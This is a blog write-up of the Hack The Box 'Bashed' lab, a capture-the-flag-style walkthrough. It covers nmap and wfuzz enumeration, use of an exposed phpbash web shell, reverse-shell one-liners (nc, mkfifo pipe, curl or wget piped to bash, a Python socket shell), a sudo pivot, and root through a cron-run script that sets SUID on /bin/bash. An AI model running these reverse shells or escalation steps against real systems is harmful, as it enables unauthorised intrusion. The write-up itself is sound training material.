---
layout: post
title:  "Bashed Writeup - Hack The Box"
date:   2025-03-27
desc: ""
keywords: "HTB,OSCP,Linux,PHPBash,Sudo,Cron,Easy"
categories: [HTB]
tags: [HTB,OSCP,Linux,PHPBash,Sudo,Cron,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

Here we are, after a few days of rest, it's time to resume the practice with **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, and for this it's my turn with the **Bashed** box. The machine has a **Linux** OS and is classified as **Easy**, but as I always recommend from the **[Hack4u](https://hack4u.io/){:target="_blank"}** community, you should always take advantage of all the labs to test, remember, and try techniques. I just have to spawn the box to start the constant practice that I must follow to become a good professional.

<br /><br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start with the **Reconnaissance** phase with `nmap`, which leaks me information about the open ports on the machine, in this lab the machine has only one open port, the **80**, but I am only analyzing for now those that are implementing the **TCP** protocol. I also get the service and its version with the same tool, but also with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I can leak information about the technologies used in the development of the web service, I don't find many interesting things. With the version I got I can know the **codename** of the box, maybe it is not a very relevant information, or maybe yes, <ins>I never know</ins>. When I access the website with the browser it informs me that a useful tool for pentesting, **phpbash**, is being implemented.

```bash
ping -c 1 10.129.142.193
whichSystem.py 10.129.142.193
sudo nmap -sS --min-rate 5000 -p- --open -vvv -Pn -n 10.129.142.193 -oG allPorts
nmap -sCV -p80 10.129.142.193 -oN targeted
# --> Apache httpd 2.4.18
# google.es --> Apache httpd 2.4.18 launchpad     Xenial

whatweb http://10.129.142.193
```

<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The website not only gives me the **[Github URL](https://github.com/Arrexel/phpbash){:target="_blank"}** of the **phpbash** project, but also gives me a possible path where the web shell script is being hosted, but if I access it I can't find them. One of the tools I use the most to search for paths, files and other interesting things on a website is `wfuzz`, and as always it does not disappoint me and quickly finds several directories. A bad implementation of the service allows me to leak all the files in each path I access, since it has **directory listing** enabled, and in one of the paths I find the scritps I was looking for.

> **[phpbash](https://github.com/Arrexel/phpbash){:target="_blank"}** is a standalone, semi-interactive **web shell**. It's main purpose is to assist in penetration tests where traditional **Reverse shells** are not possible. The design is based on the default **Kali Linux** terminal colors, so pentesters should feel right at home.

```bash
# http://10.129.142.193/uploads/
# http://10.129.142.193/uploads/phpbash.php
# http://10.129.142.193/uploads/phpbash.min.php

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.142.193/FUZZ
# images, uploads, php, css, dev, js

# http://10.129.142.193/dev/
```

<br/>
<img src="{{ site.img_path }}/bashed_writeup/Bashed_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can remotely execute commands on the machine, I will enumerate a bit and also view the contents of the flag of the low privilege user. I confirm that the **codename** matches the one I had found early on. Then I will verify the connectivity, if any, between my attacking machine and the target, for that I use `tcpdump` to capture the traces it receives on the interface I use to connect via **VPN**. Once the test is successful I try to get a **Reverse Shell**, I try different ways following the **[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** oneliner that uses different tools like nc, curl or wget, and finally with python I manage to engage the machine.

> **Webshell**:

```bash
# http://10.129.142.193/dev/phpbash.min.php

whoami
hostname
hostname -I
uname -a
lsb_release -a
```

> **Attacker Machine**:

```bash
tcpdump -i tun0 icmp -n
```

> **Webshell**:

```bash
ping -c 2 10.10.14.84
```

> **Attacker Machine**:

```bash
nc -nlvp 443
```

> **Webshell**:

```bash
nc -e /bin/sh 10.10.14.84 443
# nc: invalid option -- 'e'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.84 443 >/tmp/f
# ?
```

> **Attacker Machine**:

```bash
nvim Index.html
python3 -m http.server 80
sudo nc -nlvp 443
```

> **Webshell**:

```bash
curl http://10.10.14.84/ | bash
# ?
wget -qO- http://10.10.14.84 | bash
# bash: line 1: syntax error near unexpected token `newline'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.84",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# :)
```

<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After gaining access to the box and performing a console treatment, I can now enumerate it to find a way to perform a **User pivoting** or **Escalate privileges**. The most interesting information I find is that there are two users, besides **root**, that have a **bash** shell assigned to them, plus the user I have pwned currently has the privilege to execute any command impersonating the user **scriptmanager**, so I can pivot and get a shell without entering the user's password. If I now look for files in which I have **scriptmanager** assigned as owner user, I find a folder and a **Python** script that catches my attention.

```bash
script /dev/null -c bash
# [Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
id
groups
cat /etc/passwd | grep 'sh$'
find \-perm -4000 2>/dev/null
crontab -l
sudo -l

sudo -u scriptmanager /bin/bash
whoami
find \-user scriptmanager 2>/dev/null
find \-user scriptmanager 2>/dev/null | grep -v proc
# ./scripts
# ./scripts/test.py
```

<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

When analyzing the script, it is not very complex, since it only opens a **test.txt** file and rewrites it with a string. The most interesting thing is that this file has **root** as the owner user, and if I try to run the script I get an error because I do not have permissions to open the file, indicating that only the **root** user could be running it. To find out if there is any cron task that is running in the background and is related to this script, I find it without waiting long and also confirm that it is running under the user with maximum privileges, I found a possible vector to escalate privileges.

```bash
cat ./scripts/test.txt
cat ./scripts/test.py
cat ./scripts/test.txt; echo
python ./scripts/test.py

nano procmon.sh 
chmod +x procmon.sh 
cat procmon.sh
```

> **procmon.sh**:

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep '[\>\<]' | grep -vE 'command|kworker|procmon'
	old_process=$new_process
done
```

```bash
./procmon.sh
#      ---> /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
```

<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It has happened to me sometimes that with custom scripts I can't find interesting cron tasks, then I can appeal to **[DominicBreuker's** tool, **[pspy](https://github.com/DominicBreuker/pspy){:target="_blank"}**, which can be configured in different ways and leak very detailed information of the processes that are running on the system. I just download the project, compile it with **Go**, transfer it to the target machine and run it, but in this case it doesn't work because of version problems, so I go to an older version and again find the cron job that would allow me to pwn the box.

> **Attacker Machine**:

```bash
git clone https://github.com/DominicBreuker/pspy
go build -ldflags "-s -w" .

du -hc pspy
upx pspy
du -hc pspy

python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget http://10.10.14.84/pspy
chmod +x pspy
./pspy
# :( version `GLIBC_2.34' not found (required by ./pspy)
uname -a
# x86_64
# Version problem?
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/pspy64 .
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget http://10.10.14.84/pspy64
chmod +x pspy64
./pspy64
# :)
# 2025/03/10 06:46:01 CMD: UID=0    PID=100810 | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
# root!
```

<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To achieve the last step to finish engaging the box is not very complex, since I have write permissions in the **scripts** folder (and the **cron** task will be in charge of executing), I will create a new script that will be in charge of set the Bit **SUID** of the Bash shell and thus when migrating to a new shell with the `-p` parameter to respect the Bit SUID and achieve privilege escalation.

```bash
cd /scripts
nano privesc.py
```

> **privesc.py**:

```python
#!/usr/bin/python

import os

os.system('chmod 4755 /bin/bash')
```

```bash
ls -l /bin/bash
watch -n 1 ls -l /bin/bash              # :)
bash -p
```

<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> This box is not very complex to **Engage** but it is very good for someone who is just starting in the **Pentesting** field and also you can take advantage of the lab to look for alternative ways or do some scripting and automate the **Engagement**, you can also analyze the misconfigurations and thus not repeat these errors in the environment in which you work. 
**[Hack The Box](https://www.hackthebox.com){:target="_blank"}** always allows you to go further, learn, review and apply methods. I kill the box and look for the new challenge.

<br /><br />
<img src="{{ site.img_path }}/bashed_writeup/Bashed_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
